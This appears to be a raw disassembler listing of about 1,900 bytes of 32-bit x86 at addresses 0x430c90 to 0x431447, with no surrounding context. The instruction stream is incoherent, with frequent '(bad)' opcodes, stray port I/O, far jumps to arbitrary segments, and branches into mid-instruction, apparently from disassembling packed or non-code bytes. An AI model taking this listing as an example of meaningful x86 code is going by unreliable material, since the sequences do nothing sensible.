  430c90:	pop    esi
  430c91:	rcl    BYTE PTR [edx-0x272ca8fd],1
  430c97:	popa   
  430c98:	and    BYTE PTR [edi+ebx*4],0xb0
  430c9c:	push   ebp
  430c9d:	pop    edx
  430c9e:	outs   dx,BYTE PTR ds:[esi]
  430c9f:	xchg   ecx,eax
  430ca0:	sub    al,0x1b
  430ca2:	test   DWORD PTR [ebx-0x79],eax
  430ca5:	push   es
  430ca6:	in     eax,dx
  430ca7:	push   ecx
  430ca8:	je     0x6d69244e
  430cae:	pop    esi
  430caf:	in     al,dx
  430cb0:	xchg   ebx,eax
  430cb1:	pop    ecx
  430cb2:	mov    ecx,DWORD PTR [eax+0x6e]
  430cb5:	repnz int3 
  430cb7:	rcl    BYTE PTR [eax+0x3a900c93],0x55
  430cbe:	fadd   QWORD PTR [eax+0x5e]
  430cc1:	pop    eax
  430cc2:	sbb    eax,0x23d7e32e
  430cc7:	lock inc esp
  430cc9:	popa   
  430cca:	ret    
  430ccb:	sbb    eax,DWORD PTR [edi+edi*8-0x2cb83ebb]
  430cd2:	out    dx,al
  430cd3:	ret    
  430cd4:	(bad)  
  430cd5:	in     eax,0x7e
  430cd7:	adc    BYTE PTR [eax-0x49],0x7a
  430cdb:	(bad)  
  430cdc:	scas   eax,DWORD PTR es:[edi]
  430cdd:	xchg   esp,eax
  430cde:	cmp    eax,0xcf641a61
  430ce3:	sub    esi,edx
  430ce5:	cld    
  430ce6:	out    dx,al
  430ce7:	xchg   esp,eax
  430ce8:	inc    ecx
  430ce9:	lods   eax,DWORD PTR ds:[esi]
  430cea:	xchg   esp,eax
  430ceb:	adc    al,0xec
  430ced:	cmp    BYTE PTR [eax+0x4f84f1a0],bh
  430cf3:	fwait
  430cf4:	xlat   BYTE PTR ds:[ebx]
  430cf5:	ja     0x430d57
  430cf7:	jg     0x430d57
  430cf9:	xor    al,0x4b
  430cfb:	pop    ecx
  430cfc:	aam    0x7b
  430cfe:	sbb    eax,0x1b6072b8
  430d03:	in     al,dx
  430d04:	pop    edi
  430d05:	out    dx,al
  430d06:	cli    
  430d07:	push   edx
  430d08:	fdiv   QWORD PTR [esi+ebp*8-0x57]
  430d0c:	test   eax,0x451d9228
  430d11:	icebp  
  430d12:	cld    
  430d13:	mov    eax,ds:0x55a316ee
  430d18:	jmp    0x1ac3d44f
  430d1d:	arpl   si,bp
  430d1f:	retf   0xc651
  430d22:	dec    esp
  430d23:	sbb    DWORD PTR [esi+edi*1-0x75fc5f1e],ecx
  430d2a:	xchg   DWORD PTR [ebp+esi*2+0x38],edi
  430d2e:	fwait
  430d2f:	inc    BYTE PTR [eax-0x58d7181d]
  430d35:	ret    0xf536
  430d38:	std    
  430d39:	mov    cl,0x7a
  430d3b:	jmp    0x1c92:0x63616571
  430d42:	pusha  
  430d43:	mov    eax,ds:0xe3e7fbc3
  430d48:	xchg   BYTE PTR [ebp-0x4ea1c91c],cl
  430d4e:	push   es
  430d4f:	dec    esi
  430d50:	lea    ebx,[ebp+0x61043ef9]
  430d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d57:	enter  0x1d84,0x3f
  430d5b:	(bad)  
  430d5c:	aaa    
  430d5d:	jnp    0x430d4d
  430d5f:	sub    eax,0x6b3951cb
  430d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430d65:	aaa    
  430d66:	(bad)  
  430d67:	mov    al,ds:0xcdb23a01
  430d6c:	scas   eax,DWORD PTR es:[edi]
  430d6d:	rcl    esi,cl
  430d6f:	pop    edi
  430d70:	pop    esi
  430d71:	cld    
  430d72:	jmp    0xa8af:0xa891385d
  430d79:	pusha  
  430d7a:	cmp    al,0xdb
  430d7c:	pushf  
  430d7d:	fnstsw WORD PTR ds:0xee469592
  430d83:	loope  0x430d9d
  430d85:	adc    BYTE PTR [eax+0x0],0x25
  430d89:	add    BYTE PTR [ecx+eiz*4],cl
  430d8c:	fucomp st(6)
  430d8e:	inc    ecx
  430d8f:	idiv   BYTE PTR [ecx+0x5ee44ef9]
  430d95:	push   es
  430d96:	push   0xffffff9c
  430d98:	std    
  430d99:	mov    al,ds:0x60b6d22b
  430d9e:	adc    BYTE PTR [ecx],dl
  430da0:	in     al,dx
  430da1:	repz scas eax,DWORD PTR es:[edi]
  430da3:	xor    dl,BYTE PTR [eax+0x36]
  430da6:	out    dx,al
  430da7:	pop    ss
  430da8:	cs test ch,dl
  430dab:	xchg   ecx,eax
  430dac:	retf   0x31ff
  430daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430db0:	fmul   QWORD PTR [ecx]
  430db2:	add    eax,0xebe6f97c
  430db7:	xor    ebp,DWORD PTR [ebp+0x2b50d61c]
  430dbd:	mov    esp,0xe7bda41f
  430dc2:	xchg   ebx,eax
  430dc3:	mov    bl,0xef
  430dc5:	xchg   edi,eax
  430dc6:	sahf   
  430dc7:	lock and eax,ebx
  430dca:	out    dx,al
  430dcb:	mov    ds:0x7416923d,eax
  430dd0:	idiv   BYTE PTR [esi]
  430dd2:	shl    cl,0xfe
  430dd5:	mov    eax,0x68caeef5
  430dda:	test   DWORD PTR [ebx-0x22],edx
  430ddd:	fdivr  QWORD PTR [eax-0x1b47e488]
  430de3:	ficomp WORD PTR [esi+0x50]
  430de6:	in     eax,0xc4
  430de8:	scas   al,BYTE PTR es:[edi]
  430de9:	jmp    0x613ab746
  430dee:	in     al,dx
  430def:	ret    
  430df0:	jbe    0x430d7d
  430df2:	leave  
  430df3:	fs xchg ecx,edi
  430df6:	out    0xc9,eax
  430df8:	lahf   
  430df9:	push   edx
  430dfa:	int3   
  430dfb:	test   esi,ebx
  430dfd:	inc    edi
  430dfe:	and    dh,BYTE PTR [edi+0x28]
  430e01:	popa   
  430e02:	(bad)  
  430e03:	dec    ebx
  430e04:	ss and ebx,0xfffffff3
  430e08:	dec    ebp
  430e09:	mov    eax,0xd4f23bee
  430e0e:	test   BYTE PTR [ebx-0x5e70ec7c],dl
  430e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430e15:	maxss  xmm1,DWORD PTR [ecx]
  430e19:	scas   eax,DWORD PTR es:[edi]
  430e1a:	call   0x95b76d28
  430e1f:	gs dec ebp
  430e21:	push   esp
  430e22:	mov    al,ds:0x9435f531
  430e27:	jge    0x430e48
  430e29:	pop    edx
  430e2a:	or     edi,edx
  430e2c:	(bad)  
  430e2d:	jmp    0x430e78
  430e2f:	mov    dl,al
  430e31:	std    
  430e32:	outs   dx,BYTE PTR ds:[esi]
  430e33:	aas    
  430e34:	sahf   
  430e35:	(bad)  
  430e36:	inc    ecx
  430e37:	pop    esi
  430e38:	push   edx
  430e39:	cmp    bl,BYTE PTR [ebx-0x2a]
  430e3c:	pop    esi
  430e3d:	bnd js 0x430e2b
  430e40:	stos   BYTE PTR es:[edi],al
  430e41:	pop    ebp
  430e42:	out    0xa0,al
  430e44:	ds mov ah,0xfe
  430e47:	xchg   edx,eax
  430e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430e49:	inc    ebx
  430e4a:	pop    esi
  430e4b:	out    0x5e,al
  430e4d:	jb     0x430e64
  430e4f:	test   ch,al
  430e51:	leave  
  430e52:	imul   DWORD PTR [edx]
  430e54:	inc    edx
  430e55:	popa   
  430e56:	mov    eax,0x2e00c049
  430e5b:	push   ecx
  430e5c:	jbe    0x2ee5664f
  430e62:	xchg   ebx,eax
  430e63:	mov    bh,0x82
  430e65:	out    dx,eax
  430e66:	xor    BYTE PTR [ecx-0x18],ah
  430e69:	jecxz  0x430ee0
  430e6b:	stos   DWORD PTR es:[edi],eax
  430e6c:	(bad)  
  430e6d:	in     al,0xee
  430e6f:	into   
  430e70:	or     DWORD PTR [edi-0x496d5660],ebx
  430e76:	out    dx,al
  430e77:	ret    
  430e78:	jecxz  0x430ebb
  430e7a:	or     ebp,ebx
  430e7c:	jmp    0x430e7f
  430e7e:	jmp    0x792e:0x7d3f45a3
  430e85:	mov    ds:0x862faa6,al
  430e8a:	out    dx,al
  430e8b:	clc    
  430e8c:	stc    
  430e8d:	popf   
  430e8e:	das    
  430e8f:	push   ebp
  430e90:	jp     0x430f0e
  430e92:	enter  0xc6a0,0x22
  430e96:	pop    eax
  430e97:	mov    cs,ebp
  430e99:	(bad)  
  430e9a:	loope  0x430e3d
  430e9c:	pop    esi
  430e9d:	loope  0x430ea1
  430e9f:	xor    edi,ebp
  430ea1:	add    ebp,DWORD PTR [ecx-0x309edfc6]
  430ea7:	adc    al,0x56
  430ea9:	sub    DWORD PTR [esi],0x40
  430eac:	test   eax,0x1b47ee62
  430eb1:	sbb    DWORD PTR [ebp-0x10],edx
  430eb4:	inc    BYTE PTR [ecx-0x1a]
  430eb7:	or     BYTE PTR [esi],ch
  430eb9:	popa   
  430eba:	jae    0x430ed4
  430ebc:	ss adc ebx,edx
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	jge    0x430e75
  430ec3:	dec    eax
  430ec4:	cmp    eax,0x75a23361
  430ec9:	jbe    0x430e8b
  430ecb:	popf   
  430ecc:	es popa 
  430ece:	jno    0x430edd
  430ed0:	mov    esp,eax
  430ed2:	push   esi
  430ed3:	shr    DWORD PTR [edi],0xa9
  430ed6:	out    dx,al
  430ed7:	mov    esp,0xfe5fb396
  430edc:	cmp    ah,BYTE PTR [edi+edx*2-0x5f]
  430ee0:	mov    bh,0xcb
  430ee2:	fs xor eax,0x596eb9f2
  430ee8:	pop    esi
  430ee9:	adc    BYTE PTR [ecx-0x46f53b94],al
  430eef:	sbb    esp,esp
  430ef1:	pusha  
  430ef2:	add    eax,0x284d924c
  430ef7:	push   es
  430ef8:	(bad)  [edi]
  430efa:	out    dx,al
  430efb:	test   BYTE PTR [ecx-0x31],ah
  430efe:	jnp    0x430eac
  430f00:	outs   dx,BYTE PTR ds:[esi]
  430f01:	inc    ecx
  430f02:	xchg   edx,eax
  430f03:	mov    eax,ds:0x41726eb6
  430f08:	aad    0x9a
  430f0a:	inc    esi
  430f0b:	rcr    DWORD PTR [esi+0xb],1
  430f0e:	or     esp,DWORD PTR gs:[ecx+0x3e]
  430f12:	dec    esp
  430f13:	ror    BYTE PTR [ebx],1
  430f15:	pop    edx
  430f16:	addr16 fs push ebp
  430f19:	stos   DWORD PTR es:[edi],eax
  430f1a:	test   eax,0x3fde93d2
  430f1f:	or     edx,0x98a1317e
  430f25:	mov    ecx,0x6680ac20
  430f2a:	std    
  430f2b:	add    DWORD PTR [esi+0x7a],ebx
  430f2e:	push   cs
  430f2f:	pop    edi
  430f30:	mov    esp,0x48b8dbc3
  430f35:	test   eax,0xafd3a7b8
  430f3a:	(bad)  
  430f3b:	fnsave [ebp-0x6c1ff512]
  430f41:	and    BYTE PTR [edx-0x40],cl
  430f44:	fs push edx
  430f46:	daa    
  430f47:	(bad)  
  430f48:	sbb    dl,BYTE PTR [ebx]
  430f4a:	out    dx,al
  430f4b:	push   ecx
  430f4c:	in     eax,0x26
  430f4e:	aam    0xba
  430f50:	scas   al,BYTE PTR es:[edi]
  430f51:	fiadd  DWORD PTR [edx]
  430f53:	or     dh,BYTE PTR ds:0x2c85677d
  430f59:	xor    DWORD PTR [esi+0x4d],ecx
  430f5c:	pop    eax
  430f5d:	sub    DWORD PTR [edi+ebp*4],0x67
  430f61:	shr    esi,0x9e
  430f64:	adc    bl,BYTE PTR [edi-0xc]
  430f67:	sti    
  430f68:	jb     0x430f92
  430f6a:	out    dx,al
  430f6b:	out    dx,al
  430f6c:	div    DWORD PTR [ebp-0x7]
  430f6f:	lock fst QWORD PTR [eax-0x2b]
  430f73:	ins    BYTE PTR es:[edi],dx
  430f74:	dec    ebx
  430f75:	mov    bh,0x8
  430f77:	mov    eax,ds:0xb6325d26
  430f7c:	pop    ebp
  430f7d:	mov    bl,BYTE PTR [esp+edi*4-0x1516a5a2]
  430f84:	push   es
  430f85:	mov    bl,0x57
  430f87:	mov    esi,0x1b056133
  430f8c:	leave  
  430f8d:	pop    eax
  430f8e:	nop
  430f8f:	jae    0x430f88
  430f91:	fwait
  430f92:	out    dx,al
  430f93:	xor    dl,BYTE PTR [esi-0x77]
  430f96:	cmp    dh,BYTE PTR [edx-0x57]
  430f99:	lea    edx,[ebx+ebx*4+0x39]
  430f9d:	sub    ah,dl
  430f9f:	imul   ebp,DWORD PTR [edi+ebx*2-0x5d],0xffffff87
  430fa4:	sbb    BYTE PTR [edi-0x44],0xb0
  430fa8:	mov    edi,0x4cc2ee42
  430fad:	daa    
  430fae:	iret   
  430faf:	inc    eax
  430fb0:	xlat   BYTE PTR ds:[ebx]
  430fb1:	out    dx,al
  430fb2:	sub    al,0xa1
  430fb4:	test   DWORD PTR [edx-0x7c],edx
  430fb7:	add    cl,BYTE PTR [ebx+0x4d]
  430fba:	je     0x430fb7
  430fbc:	pop    esi
  430fbd:	rcr    esp,1
  430fbf:	dec    eax
  430fc0:	mov    esp,0x11dc21d2
  430fc5:	pusha  
  430fc6:	inc    eax
  430fc7:	mov    cl,0x30
  430fc9:	mov    ds:0x30c0f794,al
  430fce:	les    edi,FWORD PTR [ecx+0x5e]
  430fd1:	(bad)  
  430fd2:	jb     0x430fc1
  430fd4:	out    0xfd,al
  430fd6:	imul   esp,DWORD PTR [eax],0xd5f70957
  430fdc:	dec    edx
  430fdd:	jecxz  0x430fe9
  430fdf:	jb     0x43103f
  430fe1:	stos   BYTE PTR es:[edi],al
  430fe2:	ja     0x430f71
  430fe4:	mov    edx,DWORD PTR [edx-0x40]
  430fe7:	in     al,0x5e
  430fe9:	push   ecx
  430fea:	in     eax,0x78
  430fec:	jmp    0xc124:0x17cd1694
  430ff3:	call   0x9baf8c22
  430ff8:	xchg   edx,eax
  430ff9:	mov    BYTE PTR [edx],al
  430ffb:	out    dx,eax
  430ffc:	inc    edx
  430ffd:	jmp    0x430fed
  430fff:	ds pop es
  431001:	arpl   WORD PTR [ebx+0x1],dx
  431004:	sahf   
  431005:	js     0x431044
  431007:	aaa    
  431008:	mov    edi,0x4c7b8a60
  43100d:	loope  0x431056
  43100f:	inc    edi
  431010:	rcr    BYTE PTR [edi+ebx*1],1
  431013:	int    0xdb
  431015:	pop    ebp
  431016:	jmp    0xa759:0x8103ca4b
  43101d:	dec    edi
  43101e:	ret    
  43101f:	jmp    0x11f870af
  431024:	and    DWORD PTR [eax],ecx
  431026:	imul   BYTE PTR [edi+0x32]
  431029:	sbb    ch,dh
  43102b:	rcl    BYTE PTR [esi],cl
  43102d:	data16 arpl WORD PTR [edx-0x31],di
  431031:	sar    BYTE PTR [eax+0x94542a0],0x65
  431038:	mov    ebp,0x5e8fdd70
  43103d:	jmp    0xd659:0x2bb69152
  431044:	add    ah,BYTE PTR [ecx-0x46]
  431047:	test   BYTE PTR [edi+0x3c],bl
  43104a:	shl    DWORD PTR [ecx],0xc9
  43104d:	int    0xb2
  43104f:	fdivr  st,st(0)
  431051:	pusha  
  431052:	dec    ebx
  431053:	and    DWORD PTR [edi+0x6c],ecx
  431056:	rol    eax,cl
  431058:	jmp    0x60a0:0x93e5ca44
  43105f:	scas   al,BYTE PTR es:[edi]
  431060:	lock in al,dx
  431062:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  431064:	pop    ebx
  431065:	inc    esp
  431066:	and    eax,0xde749e81
  43106b:	in     eax,dx
  43106c:	loop   0x431043
  43106e:	add    al,0xa0
  431070:	push   esp
  431071:	call   0x9be16ac7
  431076:	enter  0x3191,0x5b
  43107a:	out    dx,al
  43107b:	xchg   edi,eax
  43107c:	cli    
  43107d:	call   0x586aeecb
  431082:	adc    al,0xa8
  431084:	push   0x922dec45
  431089:	jmp    0xf6f2145
  43108e:	test   DWORD PTR [ecx],ecx
  431090:	pop    esi
  431091:	sahf   
  431092:	stos   DWORD PTR es:[edi],eax
  431093:	(bad)  
  431095:	aam    0xa
  431097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431098:	inc    ebx
  431099:	popa   
  43109a:	pop    ds
  43109b:	lods   eax,DWORD PTR cs:[esi]
  43109d:	pop    ecx
  43109e:	shl    BYTE PTR [edx+0x15f3b116],0xbb
  4310a5:	xor    esi,ecx
  4310a7:	and    BYTE PTR [esi+ecx*8],al
  4310aa:	retf   0x2499
  4310ad:	bound  esi,QWORD PTR [ebp+0x7]
  4310b0:	fild   DWORD PTR [edx-0x1f063e7f]
  4310b6:	xor    ecx,DWORD PTR [edx]
  4310b8:	adc    DWORD PTR [ecx],0xffffff86
  4310bb:	repnz arpl bp,si
  4310be:	sbb    DWORD PTR [ebp-0x5d],edi
  4310c1:	rol    BYTE PTR [eax-0x12a4c1e0],0xec
  4310c8:	mov    esi,0x95857d5d
  4310cd:	pop    esp
  4310ce:	add    dh,BYTE PTR [esi]
  4310d0:	mov    bh,0xbf
  4310d2:	cs pop ebx
  4310d4:	sub    eax,0x60f6ee3f
  4310d9:	or     ebp,edi
  4310db:	lea    edx,[edi-0x665f105c]
  4310e1:	icebp  
  4310e2:	inc    esp
  4310e3:	sub    al,0x9
  4310e5:	call   0x618d:0x595e1a00
  4310ec:	inc    ecx
  4310ed:	fst    DWORD PTR [esi]
  4310ef:	push   cs
  4310f0:	inc    esp
  4310f1:	popa   
  4310f2:	jl     0x43112a
  4310f4:	ins    BYTE PTR es:[edi],dx
  4310f5:	mov    ecx,0x8a843a78
  4310fa:	in     eax,dx
  4310fb:	push   ds
  4310fc:	js     0x4310e5
  4310fe:	inc    esi
  4310ff:	xor    BYTE PTR [ebp+0x7a1b5139],ch
  431105:	pushf  
  431106:	jg     0x43109c
  431108:	mov    BYTE PTR [ebp+ebx*1+0x9c3c1a1],cl
  43110f:	rol    DWORD PTR [ebp+edi*8-0x12],0x9c
  431114:	pop    edi
  431115:	mov    esp,0x6b320d73
  43111a:	imul   ebp,DWORD PTR [ecx-0x1191e768],0xe648d6e5
  431124:	add    DWORD PTR [edi+0x62],ebx
  431127:	xchg   edi,eax
  431128:	xor    bl,BYTE PTR [edx+0x795ee9cd]
  43112e:	icebp  
  43112f:	in     al,dx
  431130:	rcr    eax,cl
  431132:	push   0x561678d
  431137:	loope  0x4311b6
  431139:	lods   eax,DWORD PTR ds:[esi]
  43113a:	add    esi,edi
  43113c:	neg    DWORD PTR [ecx-0x12]
  43113f:	pop    ebp
  431140:	pop    edx
  431141:	jmp    0x431115
  431143:	fidivr DWORD PTR [edx-0x7f5eec15]
  431149:	rol    ch,0x31
  43114c:	sub    edx,DWORD PTR [esi+0x6d5e09ae]
  431152:	out    0xcb,al
  431154:	add    BYTE PTR [eax],dh
  431156:	sub    bh,0x6e
  431159:	pusha  
  43115a:	inc    ebx
  43115b:	sub    dl,BYTE PTR [ecx-0x16]
  43115e:	ret    0x38a4
  431161:	ret    0x50ff
  431164:	and    edi,ecx
  431166:	scas   al,BYTE PTR es:[edi]
  431167:	pop    ebx
  431168:	xchg   BYTE PTR [edi+0x607d5ea0],bl
  43116e:	sbb    ebx,DWORD PTR [eax+0x1f371363]
  431174:	jb     0x4311bc
  431176:	out    dx,al
  431177:	fld    QWORD PTR [ebx]
  431179:	cmc    
  43117a:	loop   0x4311bd
  43117c:	mov    ebx,0xa0a12bc5
  431181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431182:	push   ss
  431183:	mov    cl,0xd5
  431185:	inc    ecx
  431186:	sub    DWORD PTR [edi+0x5a],ebx
  431189:	cs inc ecx
  43118b:	fcom   DWORD PTR [edi+ecx*2+0x6d]
  43118f:	dec    esp
  431190:	xlat   BYTE PTR ds:[ebx]
  431191:	mov    ebp,0x419bc966
  431196:	or     dh,BYTE PTR [ecx-0x39]
  431199:	adc    dl,dh
  43119b:	push   edx
  43119c:	push   ds
  43119d:	jg     0x43118c
  43119f:	in     al,dx
  4311a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311a1:	mov    esi,gs
  4311a3:	or     BYTE PTR [ecx+0x7],bh
  4311a6:	mov    esi,0x1594cccb
  4311ab:	mov    eax,ds:0xa2bc6c84
  4311b0:	adc    bl,BYTE PTR [ecx+0x515ee351]
  4311b6:	fiadd  DWORD PTR [eax-0x56321010]
  4311bc:	jae    0x43121e
  4311be:	aad    0xc0
  4311c0:	lahf   
  4311c1:	dec    esi
  4311c2:	popa   
  4311c3:	push   esp
  4311c4:	or     al,BYTE PTR [eax-0x38c9f112]
  4311ca:	jp     0x4311f1
  4311cc:	fsubr  QWORD PTR [esi+0x162fa10f]
  4311d2:	imul   ebx,DWORD PTR [edi],0x6ad870b9
  4311d8:	pop    esi
  4311d9:	inc    esi
  4311da:	fld    st(0)
  4311dc:	icebp  
  4311dd:	mov    ds:0x2ddbacd2,eax
  4311e2:	lods   al,BYTE PTR ds:[esi]
  4311e3:	mov    al,ds:0x69c50bea
  4311e8:	sbb    esi,DWORD PTR [ebp+ebp*1+0x1dc15e89]
  4311ef:	sbb    dl,BYTE PTR [edi+edx*2+0x5d82b43b]
  4311f6:	outs   dx,DWORD PTR ds:[esi]
  4311f7:	daa    
  4311f8:	(bad)  
  4311fa:	clc    
  4311fb:	add    bl,dh
  4311fd:	aad    0xcf
  4311ff:	xchg   edx,eax
  431200:	xor    bh,cl
  431202:	dec    edx
  431203:	and    DWORD PTR [esi],esi
  431205:	push   ebp
  431206:	add    DWORD PTR [edx+edx*2-0x7c],esi
  43120a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43120b:	mov    al,ds:0xab7ce44e
  431210:	adc    al,0x5a
  431212:	daa    
  431213:	xor    BYTE PTR [ebp+0x2e],bl
  431216:	xchg   edi,eax
  431217:	jb     0x43122b
  431219:	div    DWORD PTR [esi-0x70]
  43121c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43121d:	repz aas 
  43121f:	mul    DWORD PTR [esi+0x378d641]
  431225:	pop    esi
  431226:	inc    esi
  431227:	hlt    
  431228:	(bad)  
  431229:	pop    ebp
  43122a:	out    dx,al
  43122b:	enter  0x89fc,0x9d
  43122f:	inc    eax
  431230:	cmp    al,0xf8
  431232:	adc    ch,BYTE PTR [ecx-0x25912845]
  431238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431239:	or     eax,0xfce4856b
  43123e:	dec    ebp
  43123f:	imul   ebx,DWORD PTR [ebp+ebx*4-0x2995fa12],0xf02e73bd
  43124a:	xor    al,0xa1
  43124c:	rol    DWORD PTR [ebx],1
  43124e:	aas    
  43124f:	(bad)  
  431250:	call   0x42ee:0x5e43faf1
  431257:	sbb    bl,BYTE PTR [ebp-0x7159d169]
  43125d:	pusha  
  43125e:	push   cs
  43125f:	mov    eax,0x3e88c506
  431264:	test   eax,0xa3fbed89
  431269:	outs   dx,BYTE PTR ds:[esi]
  43126a:	bound  ebp,QWORD PTR [ebx+0x7b56d65f]
  431270:	repz pusha 
  431272:	rol    BYTE PTR [ebp+0x4dd96978],cl
  431278:	bound  ebx,QWORD PTR [edi]
  43127a:	out    dx,al
  43127b:	out    0xc6,al
  43127d:	dec    ecx
  43127e:	std    
  43127f:	push   eax
  431280:	icebp  
  431281:	lds    ebp,FWORD PTR [ebp-0x5f]
  431284:	imul   ecx,DWORD PTR [esi],0x2607ddef
  43128a:	icebp  
  43128b:	push   ecx
  43128c:	pop    esi
  43128d:	stos   BYTE PTR es:[edi],al
  43128e:	(bad)  
  43128f:	stos   BYTE PTR es:[edi],al
  431290:	jb     0x4312a7
  431292:	pop    edi
  431293:	xor    eax,ebp
  431295:	inc    ecx
  431296:	jle    0x431293
  431298:	and    esp,DWORD PTR [ecx]
  43129a:	adc    ch,cl
  43129c:	call   0xdf0c:0x5ecc6a38
  4312a3:	fwait
  4312a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4312a5:	dec    ebx
  4312a6:	jmp    0x39e6:0x75a1b08
  4312ad:	gs enter 0x8a33,0x17
  4312b2:	jle    0x4312e5
  4312b4:	or     edx,DWORD PTR [ebp-0x35aefb12]
  4312ba:	xchg   ebx,eax
  4312bb:	addr16 imul edx,edi,0x2e
  4312bf:	mov    ds:0x974199a8,al
  4312c4:	(bad)  
  4312c6:	mov    ch,0x60
  4312c8:	mov    cl,0x6b
  4312ca:	call   FWORD PTR [esi+0x6f2e1f4b]
  4312d0:	in     al,0x11
  4312d2:	(bad)  
  4312d3:	sbb    BYTE PTR [edx+0x52],al
  4312d6:	(bad)  
  4312d7:	outs   dx,DWORD PTR ds:[esi]
  4312d8:	xchg   edx,eax
  4312d9:	popf   
  4312da:	outs   dx,BYTE PTR ds:[esi]
  4312db:	fdivrp st(6),st
  4312dd:	test   DWORD PTR [ebp+ebx*2-0x7490d3a3],esp
  4312e4:	imul   eax,esp,0xe46ecec6
  4312ea:	ins    BYTE PTR es:[edi],dx
  4312eb:	mov    eax,ds:0x9b48cf30
  4312f0:	mov    edi,0x5e7716f8
  4312f5:	mov    dl,0xe2
  4312f7:	adc    BYTE PTR [edx+0x74bde111],al
  4312fd:	inc    esp
  4312fe:	call   0xef33:0x61615b07
  431305:	imul   ecx,DWORD PTR [esi],0xffffff8b
  431308:	pop    esi
  431309:	mov    cl,cl
  43130b:	imul   ecx,DWORD PTR [ecx+0x6a9e1c1],0x43
  431312:	xchg   DWORD PTR [esi],esp
  431314:	test   eax,0xb5709c5f
  431319:	test   ax,0x200
  43131d:	out    0xee,eax
  43131f:	hlt    
  431320:	jbe    0x4312ed
  431322:	dec    edi
  431323:	or     bl,BYTE PTR [ebx]
  431325:	jnp    0x431390
  431327:	mov    ds:0x55a6d778,al
  43132c:	jmp    0x47abf810
  431331:	cdq    
  431332:	repz jne 0x431384
  431335:	jl     0x431306
  431337:	and    BYTE PTR [esi+0x2d01cb2a],bh
  43133d:	mov    edi,0xc3cfa15a
  431342:	mov    WORD PTR [ebx-0x6405d323],ss
  431348:	pop    esi
  431349:	cmp    eax,0xcb1dc7e6
  43134e:	in     eax,dx
  43134f:	mov    dh,0x6f
  431351:	pop    ebp
  431352:	dec    ebp
  431353:	jno    0x43133b
  431355:	sbb    eax,0x2e7e9f86
  43135a:	repnz mov dl,BYTE PTR [edx-0xd]
  43135e:	repz pop ds
  431360:	sahf   
  431361:	shl    DWORD PTR ds:[ebp-0x5f45e03d],1
  431368:	add    edx,eax
  43136a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43136b:	mov    ebx,0x61ddf0fb
  431370:	pop    esi
  431371:	push   esi
  431372:	ins    DWORD PTR es:[edi],dx
  431373:	cmp    BYTE PTR [eax],bl
  431375:	adc    ebp,DWORD PTR [ecx+0x77]
  431378:	outs   dx,BYTE PTR ds:[esi]
  431379:	jp     0x431380
  43137b:	jmp    0xa084:0xd61a5c6f
  431382:	das    
  431383:	or     esp,DWORD PTR [ebp+0x78]
  431386:	not    ebx
  431388:	add    dl,BYTE PTR [bx+si+0x48e]
  43138d:	and    DWORD PTR ds:0x8756b509,ecx
  431393:	js     0x4313f3
  431395:	bnd jmp 0x9b619a67
  43139b:	and    eax,DWORD PTR ds:0xa4836060
  4313a1:	lock xchg ebp,eax
  4313a3:	(bad)  
  4313a4:	xor    BYTE PTR [ecx-0x6ea14dfc],cl
  4313aa:	inc    esi
  4313ab:	and    al,0xb0
  4313ad:	adc    al,0x91
  4313af:	xor    DWORD PTR fs:[ecx+0x2a],esp
  4313b3:	(bad)  
  4313b4:	or     ebp,DWORD PTR fs:[edi+0x482e2ac4]
  4313bb:	aaa    
  4313bc:	pop    esi
  4313bd:	stc    
  4313be:	xchg   edi,eax
  4313bf:	test   BYTE PTR [ecx-0x7c],ah
  4313c2:	cmp    ch,BYTE PTR [ebx-0x6e]
  4313c5:	pusha  
  4313c6:	adc    BYTE PTR [ecx+esi*4],dl
  4313c9:	int3   
  4313ca:	ds xchg edi,eax
  4313cc:	xchg   DWORD PTR [esi-0x1f0fb812],ebp
  4313d2:	mov    WORD PTR [ebx-0x5ee3e1fd],gs
  4313d8:	cli    
  4313d9:	out    dx,eax
  4313da:	adc    dh,BYTE PTR [esp+ebx*8+0x3e]
  4313de:	ret    
  4313df:	ret    
  4313e0:	pop    esi
  4313e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313e2:	fwait
  4313e3:	sbb    al,0x4f
  4313e5:	shr    BYTE PTR [ecx+0x4613010],cl
  4313eb:	test   al,0x9d
  4313ed:	mov    ch,0xe6
  4313ef:	inc    esi
  4313f0:	cs fucomi st,st(6)
  4313f3:	or     ecx,esp
  4313f5:	std    
  4313f6:	jp     0x43144f
  4313f8:	add    BYTE PTR [edx],al
  4313fa:	in     al,0xa0
  4313fc:	stos   BYTE PTR es:[edi],al
  4313fd:	(bad)  
  4313fe:	popa   
  4313ff:	sbb    dl,ah
  431401:	call   0x4621:0xe75e51a9
  431408:	and    eax,0x7d992941
  43140d:	pusha  
  43140e:	pop    esp
  43140f:	jne    0x431421
  431411:	and    BYTE PTR [ebx+0x4a],bl
  431414:	sub    dl,BYTE PTR [ebp+0x674415ee]
  43141a:	mov    bh,0x12
  43141c:	cld    
  43141d:	lea    esp,[esi]
  43141f:	mov    eax,ds:0x5e93346b
  431424:	mov    cs,WORD PTR [ecx+0x4b269d66]
  43142a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43142b:	mov    eax,ds:0x29552e1
  431430:	push   ds
  431431:	inc    ebp
  431432:	fbld   TBYTE PTR [eax+0x7cab29c2]
  431438:	pop    eax
  431439:	dec    ebp
  43143a:	xchg   ecx,eax
  43143b:	cs pop esi
  43143d:	pop    edi
  43143e:	pop    edi
  43143f:	ja     0x4314ac
  431441:	push   0xffffff9a
  431443:	je     0x43143d
  431445:	pop    ecx
  431446:	dec    eax
  431447:	test   DWORD PTR [ebx],edx
